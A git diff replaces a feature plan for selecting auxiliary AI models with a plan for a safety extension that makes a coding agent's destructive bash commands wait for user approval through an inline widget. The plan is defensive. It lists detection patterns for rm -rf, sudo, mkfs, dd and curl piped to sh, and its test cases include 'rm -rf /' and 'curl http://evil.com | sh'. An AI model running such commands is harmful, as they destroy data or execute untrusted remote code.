@@ -1,105 +1,150 @@
-# Feature Plan: Auxiliary AI Model Configuration & Compact Indicators
-
 <!-- SUMMARY -->
-Add user-configurable AI model selection in Settings for auxiliary AI features (AI Commit Message generation, AI Usage Insights, and quick AI prompts), accompanied by an ultra-compact, space-saving model badge indicator and informative tooltips across all auxiliary AI touchpoints in Hive Studio.
+# Destructive Bash Command Guard & Inline Approval Widget (Executive Summary)
 
-### What is changing:
-1. **Settings > Models Tab**: Add a "Feature Models & Auxiliary AI" configuration section allowing users to choose the model for:
-   - **Git Commit Message generation** (Active Session Model, Pi CLI Default, or any enabled catalog model).
-   - **AI Usage Insights** (Active Session Model, Pi CLI Default, specific catalog model, or fast deterministic analyzer).
-2. **Persistent Store (`feature-models-store.ts`)**: Zustand store backed by `localStorage` (`hive.feature-models.v1`) to persist choices and resolve active/fallback models.
-3. **Ultra-Compact Model Indicator (`AiModelChip.tsx`)**: A tiny, 9px micro-badge with rich tooltip (`AI Model: <name> (<source>) · Configure in Settings`) designed specifically to take negligible horizontal space and prevent layout crowding.
-4. **GitPanel**: Show model chip on the "AI Message" button, include model in the button tooltip, and pass the configured model to the Pi CLI one-shot commit message generator.
-5. **UsageView & AI Usage Insights Modal**: Show model chip on "Analyze with AI" and in the insights modal header; optionally invoke Pi CLI for LLM-powered telemetry analysis when a model is selected.
-6. **Diff & File Viewers**: Display active model chip and tooltip on "Ask Pi" buttons.
+> [!NOTE]
+> **Executive Summary**: Implement a safety extension for Pi that intercepts dangerous bash tool calls (`rm -rf`, `sudo`, destructive git, disk operations) combined with a bespoke inline approval card (`CommandApprovalBar`) rendered directly above the message composer in Hive Studio, replacing the intrusive full-screen modal with an ergonomic workflow.
+
+## High-Level Strategy & Architecture
+- **Pi Extension (`bash-guard.ts`)**: Hooks `pi.on("tool_call")` for tool `bash`. Evaluates the command against a categorized destructive taxonomy and invokes `ctx.ui.confirm` with structured metadata if a dangerous pattern is detected.
+- **Hive Inline Approval Widget (`CommandApprovalBar.tsx`)**: Renders above the message input in `Composer.tsx` with risk badges, syntax-highlighted command preview, copy button, and keyboard-accessible **Block** (`Esc`) and **Allow Once** (`Enter`) actions.
+- **Protocol Integration**: Leverages Pi's existing JSONL RPC UI subprotocol (`extension_ui_request` / `extension_ui_response`), avoiding custom RPC hacks and keeping terminal CLI compatibility.
+
+## Key Decisions
+
+> [!CHOICE] Integration Method: Native `extension_ui_request` vs Custom Bridge Topic
+> **Question**: How should the extension notify Hive of a pending confirmation?
+> - (x) **Native `ctx.ui.confirm` / RPC UI Request**: Standard Pi extension protocol. Works in both Hive (as inline widget) and Pi CLI terminal (as CLI confirm prompt) without custom protocol changes. [Recommended]
+> - ( ) **Custom Bridge Topic (`toGui`)**: Dedicated WebSocket/bridge event. Only works inside Hive and bypasses Pi CLI's standard UI contract.
+
+> [!CHOICE] Extension Distribution
+> **Question**: Where should the safety extension be installed and maintained?
+> - (x) **Bundled Companion Extension**: Shipped in Hive desktop resources and automatically loaded on session spawn via `-e` (or user toggleable in Settings). [Recommended]
+> - ( ) **User-Level Only (`~/.pi/agent/extensions`)**: Must be manually copied to the user's home directory.
+
+## Execution Milestones
+- [ ] 1. Core Safety Rule Engine & Pi Extension (`bash-guard.ts`)
+- [ ] 2. Renderer State & Dialog Routing (`session-store.ts`)
+- [ ] 3. Inline Approval UI Component (`CommandApprovalBar.tsx` + styles)
+- [ ] 4. Composer Mount & Modal Suppression (`Composer.tsx` & `ExtensionDialogModal.tsx`)
+- [ ] 5. End-to-End Verification with safe vs destructive bash commands
+<!-- /SUMMARY -->
 
 <!-- FULL -->
+# Destructive Bash Command Guard & Inline Approval Widget (Full Specification)
 
-## Architecture & Data Flow
+## 1. Objective & Background
+When Pi runs commands via the `bash` tool, destructive operations (e.g. `rm -rf`, `git reset --hard`, `mkfs`, `sudo`) currently execute without friction unless an extension halts them. In standard Pi CLI, `permission-gate.ts` prompts via curses/readline. In Hive, unhandled dialogs either pop up a full-screen blocking modal overlay (`ExtensionDialogModal`) or are unstyled.
 
+The goal is to provide a clean, non-intrusive safety guard that docks directly **above the message composer area** in Hive, giving developers clear insight into what the agent is attempting to run and letting them approve or reject it in-stride.
+
+## 2. Component Architecture & Data Flow
+
+```mermaid
+sequenceDiagram
+    participant Agent as Pi Agent
+    participant Guard as bash-guard Extension
+    participant RPC as Pi RPC Pipe
+    participant Main as Hive Main Process
+    participant Store as Session Store (Zustand)
+    participant UI as Composer Widget (Hive)
+
+    Agent->>Guard: tool_call (bash: "rm -rf ./dist")
+    Guard->>Guard: Match taxonomy rules (recursive delete)
+    Guard->>RPC: ctx.ui.confirm("Dangerous Bash Command", payload)
+    RPC->>Main: extension_ui_request (method: "confirm")
+    Main->>Store: IPC.evtUiRequest
+    Store->>UI: Set pendingCommandApproval
+    UI-->>UI: Render CommandApprovalBar above Composer
+    alt User clicks Block / presses Esc
+        UI->>Store: respondDialog(confirmed: false)
+        Store->>Main: IPC.uiResponse
+        Main->>RPC: extension_ui_response (confirmed: false)
+        RPC->>Guard: resolve false
+        Guard-->>Agent: { block: true, reason: "Blocked by user" }
+    else User clicks Allow / presses Enter
+        UI->>Store: respondDialog(confirmed: true)
+        Store->>Main: IPC.uiResponse
+        Main->>RPC: extension_ui_response (confirmed: true)
+        RPC->>Guard: resolve true
+        Guard-->>Agent: undefined (Proceed execution)
+    end
 ```
-┌────────────────────────────────────────────────────────┐
-│ Settings > Models (ModelsSettingsContent.tsx)          │
-│ - Configure Git Commit Model (Session / Default / Custom)│
-│ - Configure Usage Analysis Model (Session / Default / etc)│
-└──────────────────────────┬─────────────────────────────┘
-                           │ updates
-                           ▼
-┌────────────────────────────────────────────────────────┐
-│ feature-models-store.ts (Zustand + localStorage)       │
-│ - Persists: gitCommit, usageAnalysis preferences       │
-│ - Resolves: active model ID, display name, short badge  │
-└──────┬───────────────────┬──────────────────────┬──────┘
-       │                   │                      │
-       ▼                   ▼                      ▼
-┌──────────────┐   ┌──────────────┐       ┌──────────────┐
-│ GitPanel.tsx │   │ UsageView &  │       │ Diff & File  │
-│ [AI Message] │   │ InsightsModal│       │ Viewers      │
-│  <Chip/>     │   │  <Chip/>     │       │ [Ask Pi]<Chip│
-└──────┬───────┘   └──────┬───────┘       └──────────────┘
-       │                   │
-       ▼                   ▼
-┌────────────────────────────────────────────────────────┐
-│ Main Process IPC (git.generateCommitMessage / Usage)    │
-│ - Runs Pi CLI with selected `--model <resolvedModelId>` │
-└────────────────────────────────────────────────────────┘
-```
 
-## Detailed Implementation Steps
+## 3. Destructive Command Taxonomy
 
-### 1. Feature Models Store (`apps/desktop/src/renderer/store/feature-models-store.ts`)
-- Interface `FeatureModelConfig`: `{ source: "session" | "pi-default" | "custom"; modelId?: string }`
-- Interface `ResolvedFeatureModel`:
-  - `id: string` (e.g. `anthropic/claude-3-5-haiku` or `gemini-3.8-flash`)
-  - `name: string` (e.g. `Claude 3.5 Haiku`)
-  - `shortName: string` (e.g. `haiku`, `flash`, `opus`, `sonnet`, `pro`)
-  - `provider?: string`
-  - `sourceLabel: string` (e.g. `Active Session`, `Settings Override`, `Pi Default`)
-- Helper `getShortModelName(id, name)`: cleans long IDs into concise 4-8 char pills.
-- Helper `resolveFeatureModel(config, sessionModel, defaultModel, catalog)`: computes the active model and source description with zero flicker.
+The rule engine inspects commands and subshell pipelines (`&&`, `||`, `;`, `|`, `$(...)`, `` `...` ``) against:
 
-### 2. Ultra-Compact Indicator Component (`apps/desktop/src/renderer/components/AiModelChip.tsx`)
-- Micro-pill design:
-  - Font size: `9px`
-  - Line height: `1`
-  - Padding: `1.5px 5px`
-  - Rounded: `3.5px`
-  - Color: `var(--accent-base)` with subtle background `rgba(var(--accent-rgb), 0.12)`
-  - Maximum width: `60px` (with ellipsis)
-- Tooltip: `title="Model: ${model.name || model.id} (${model.sourceLabel})\nClick to change in Settings > Models"`
-- Clicking the chip opens the Settings modal on the Models tab.
+| Rule ID | Category | Pattern Examples | Severity | User-Facing Description |
+|---|---|---|---|---|
+| `fs-purge` | Filesystem Purge | `rm\s+(-[a-zA-Z]*r[a-zA-Z]*f?\|--recursive)` | `critical` | Recursive file or folder deletion |
+| `git-wipe` | Destructive Git | `git\s+(reset\s+--hard\|clean\s+-[a-zA-Z]*f\|push\s+.*--force)` | `high` | Overwrites uncommitted changes or git history |
+| `priv-esc` | Privilege Escalation | `\b(sudo\|su\s+-)\b`, `chmod\s+(-R\s+)?777` | `critical` | Root privilege escalation or unrestricted file permissions |
+| `disk-raw` | Disk / Partition | `\bmkfs\b`, `\bdd\s+if=`, `>\s*/dev/sd[a-z]` | `critical` | Raw drive write or filesystem format |
+| `remote-pipe` | Remote Shell Pipe | `curl\s+.*\|\s*(ba)?sh`, `wget\s+.*\|\s*(ba)?sh` | `high` | Remote script piped directly to shell |
+| `db-drop` | Database Loss | `drop\s+(database\|table)`, `truncate\s+table` | `critical` | Database table or schema deletion |
 
-### 3. Settings UI: Feature Models Section (`apps/desktop/src/renderer/components/ModelsSettingsContent.tsx`)
-- Add a new section **"Dedicated Feature Models"**:
-  - Row for **Git Commit Message**:
-    - Mode selector: "Active Session Model" | "Pi Default Model" | "Choose Specific Model"
-    - If "Choose Specific Model", a clean select dropdown populated from all catalog/enabled models.
-    - Live preview chip showing the resulting indicator.
-  - Row for **AI Usage Insights**:
-    - Mode selector: "Active Session Model" | "Pi Default Model" | "Choose Specific Model" | "Fast Local Analyzer"
-    - Live preview chip showing the resulting indicator.
+## 4. UI/UX Specification: `CommandApprovalBar`
 
-### 4. Git Commit Message (`apps/desktop/src/renderer/components/GitPanel.tsx`)
-- Subscribe to `useFeatureModelStore` to resolve the commit message model.
-- Embed `<AiModelChip model={commitModel} />` inside the "AI Message" button.
-- Update button tooltip to clearly show the model being used.
-- Pass `commitModel.id` to `window.studio.generateCommitMessage(activeProject.path, commitModel.id)`.
+### Layout & Placement
+- Rendered inside `Composer.tsx`, positioned right above `<div className="composer-editor-box">`, stacked with other composer alerts (`ModelSwitchCacheBar`, `QueuedMessagesBar`).
+- Does **not** push messages out of view or pop up a full-screen dark modal.
 
-### 5. Usage Insights (`UsageView.tsx` & `AiUsageInsights.tsx`)
-- Subscribe to `useFeatureModelStore` to resolve the usage analysis model.
-- Embed `<AiModelChip model={usageModel} />` inside the "Analyze with AI" button.
-- Embed `<AiModelChip model={usageModel} />` in the `AiUsageInsightsModal` header.
-- Update tooltips to display model name and source.
-- Add IPC `window.studio.generateUsageInsights` (via `IPC.aiGenerateUsageInsights`) to allow LLM synthesis when an AI model is configured, with instant deterministic fallback.
+### Visual Structure
+- **Border / Background**: Warning border `color-mix(in srgb, var(--warning, #f59e0b) 45%, transparent)` with elevated card background (`var(--bg-elevated)`).
+- **Header**:
+  - `ShieldAlert` icon in amber/accent.
+  - Title: "Dangerous Bash Command Detected".
+  - Severity Chip: `[CRITICAL]` (red) or `[HIGH]` (amber).
+  - Shortcut badge: `Esc to block`.
+- **Command Box**:
+  - Monospace font (`var(--font-mono)`, 11.5px) in dark code card with line wrapping.
+  - Copy command button (`Copy` icon).
+- **Actions**:
+  - **Block Execution** button (`button-secondary` with red text hover, mapped to `Escape`).
+  - **Allow Once** button (`button-primary` in warning/accent style, mapped to `Enter`).
 
-### 6. Quick AI Actions in DiffViewer & FileViewer
-- In `DiffViewerTab.tsx` and `FileViewerTab.tsx`, show the active model tooltip and compact chip on the "Ask Pi" buttons so users immediately know which model will answer.
+## 5. Step-by-Step Implementation Breakdown
 
-## Verification Strategy
-- **Unit Tests**:
-  - Test `feature-models-store.ts` for default values, persistence, and resolution logic (session vs custom vs pi-default).
-  - Test `getShortModelName` edge cases (haiku, opus, flash, custom names, provider prefixes).
-- **Automated Suite**: Run full `npm test` across all 46 suites to ensure zero regressions.
-- **Manual Verification**:
-  - Verify GitPanel button layout: ensure commit button is not cramped on narrow sidebars.
-  - Verify Settings dropdown saves and updates badges immediately across all tabs.
+### 1. Pi Extension: `apps/desktop/resources/bridge/bash-guard.ts`
+- Implement `pi.on("tool_call")` filter.
+- Parse chained commands and match against rule taxonomy.
+- Return early if safe.
+- Emit structured metadata in `ctx.ui.confirm` with JSON payload `{ kind: "dangerous_bash_approval", command, reason, severity, rule }`.
+
+### 2. Dialog Routing & Store: `apps/desktop/src/renderer/store/session-store.ts`
+- In `onUiRequest`:
+  - Check if `request.method === "confirm"` and `request.message` contains `dangerous_bash_approval`.
+  - Store as `pendingCommandApproval: { id: request.id, ...parsedData }`.
+  - Expose `resolveCommandApproval(id: string, confirmed: boolean)` which calls `respondDialog`.
+
+### 3. Component: `apps/desktop/src/renderer/components/CommandApprovalBar.tsx`
+- Build the React component using `lucide-react` icons (`ShieldAlert`, `Copy`, `Check`, `Ban`, `Play`).
+- Implement keyboard listener (`Enter` to approve, `Escape` to deny).
+- Add CSS styling matching Hive's design tokens in `apps/desktop/src/renderer/styles/command-approval-bar.css`.
+
+### 4. Composer Integration: `apps/desktop/src/renderer/components/Composer.tsx`
+- Mount `<CommandApprovalBar />` above the editor droppable container.
+- Update `ExtensionDialogModal.tsx` to ignore requests handled by `CommandApprovalBar`.
+
+## 6. File Changes Breakdown
+
+| File | Action | Description |
+|---|---|---|
+| `apps/desktop/resources/bridge/bash-guard.ts` | `[NEW]` | Destructive command inspection extension for Pi |
+| `apps/desktop/src/renderer/components/CommandApprovalBar.tsx` | `[NEW]` | Inline approval widget component above composer |
+| `apps/desktop/src/renderer/styles/command-approval-bar.css` | `[NEW]` | CSS styling for the approval widget |
+| `apps/desktop/src/renderer/components/Composer.tsx` | `[MODIFY]` | Mount `CommandApprovalBar` above editor box |
+| `apps/desktop/src/renderer/components/ExtensionDialogModal.tsx` | `[MODIFY]` | Suppress full-screen modal when command approval is active |
+| `apps/desktop/src/renderer/store/session-store.ts` | `[MODIFY]` | Add `pendingCommandApproval` state & route UI requests |
+| `apps/desktop/src/main/services/session-manager.ts` | `[MODIFY]` | Load `bash-guard.ts` into spawned Pi sessions |
+
+## 7. Verification & Automated Test Plan
+- Unit test rule parser with positive and negative regex cases:
+  - Positive: `rm -rf /`, `echo ok && git reset --hard HEAD~1`, `sudo apt update`, `curl http://evil.com | sh`.
+  - Negative: `npm test`, `git status`, `ls -la`, `rm file.txt` (non-recursive).
+- Integration test in Hive workbench:
+  - Run prompt that attempts `rm -rf dist`.
+  - Verify `<CommandApprovalBar />` appears above composer.
+  - Verify clicking "Block" causes agent to receive cancellation and gracefully stop.
+  - Run prompt again, click "Allow", verify command executes.
+<!-- /FULL -->
